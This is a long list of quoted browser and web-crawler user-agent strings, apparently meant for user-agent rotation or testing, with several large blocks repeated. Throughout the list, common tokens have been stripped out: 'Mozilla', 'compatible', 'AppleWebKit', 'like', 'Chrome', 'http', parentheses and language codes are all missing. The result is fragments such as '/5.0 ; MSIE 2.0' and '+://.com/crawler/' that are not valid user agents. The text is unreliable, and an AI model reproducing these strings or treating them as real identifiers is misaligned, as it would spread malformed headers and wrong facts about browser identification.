	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620"
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com"
	"/5.0 ; /1.0; +://www.anyapex.com/.html"
	"/4.0 ; Arachmo"
	"/4.0 ; B-l-i--z-B-O-T"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html"
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm"
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-"
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/4.0  /1.0  Link Checker @; ://.com"
	"/4.0  /1.0  Link Checker .dlc@; ://.com"
	"/4.0  /1.0 -@; ://.com"
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 PLAYSTATION 3; 3.55"
	"/5.0 PLAYSTATION 3; 2.00"
	"/5.0 PLAYSTATION 3; 1.00"
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0"
	"/5.0 ; /1.0; +://www.abilogic.com/.html"
	"SiteBar/3.3.8 Bookmark Server; :///"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"/4.0 ;  3.0; Macintosh"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; "
	"/4.0 ; MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/2.1 ://.com/.html"
	"/9.20 Windows NT 6.0; U; "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322"
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13"
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 ; /2.1; +://.com/.html"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620"
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com"
	"/5.0 ; /1.0; +://www.anyapex.com/.html"
	"/4.0 ; Arachmo"
	"/4.0 ; B-l-i--z-B-O-T"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html"
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm"
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-"
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/4.0  /1.0  Link Checker @; ://.com"
	"/4.0  /1.0  Link Checker .dlc@; ://.com"
	"/4.0  /1.0 -@; ://.com"
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA"
